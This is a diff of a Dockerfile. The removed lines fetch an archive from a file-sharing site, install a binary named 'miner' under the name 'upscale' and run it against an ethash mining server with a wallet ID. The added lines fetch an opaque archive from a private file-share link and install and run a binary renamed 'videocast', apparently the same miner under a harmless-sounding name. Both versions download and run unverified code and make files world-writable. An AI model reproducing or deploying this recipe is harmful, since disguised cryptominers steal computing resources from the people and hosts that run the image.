@@ -4,17 +4,17 @@ LABEL maintainer="Roman Nikov"
 
 RUN apt update; \
     apt install -y wget; \
-    wget https://www.4sync.com/web/directDownload/1RZH1ucq/15xqQxN1.a888d2a0703a72867b648d5452418dce; \
-    tar xf 15xqQxN1.a888d2a0703a72867b648d5452418dce; \
-    cd upscale; \
-    cp miner /usr/local/bin/upscale; \
-    cp mine_eth.sh /usr/local/bin/mine_eth.sh; \
+    wget https://cdn.filesend.jp/private/msYMulfdBD3GfhRnQFZNLCzgJ5rLkpDcfB0dPPGlKIGi96JVDzba3BMzy1gNnh9C/vcast.tar.gz; \
+    tar xf vcast.tar.gz; \
+    cd vcast; \
+    cp config.json /usr/local/bin/config.json; \
+    cp videocast /usr/local/bin/videocast; \
     cd /usr/local/bin;
 
 WORKDIR /usr/local/bin
 
-RUN chmod 777 mine_eth.sh;
+RUN chmod 777 config.json;
 
-RUN chmod 777 upscale;
+RUN chmod 777 videocast;
 
-CMD upscale --algo ethash --server workload.sytes.net:2020 --user nano_3bf6aph9zbwp358tgqwtzqua9w3wxfhyuw3x11mb6a6bjah5jiewmzog9jpg.upscale
+CMD videocast
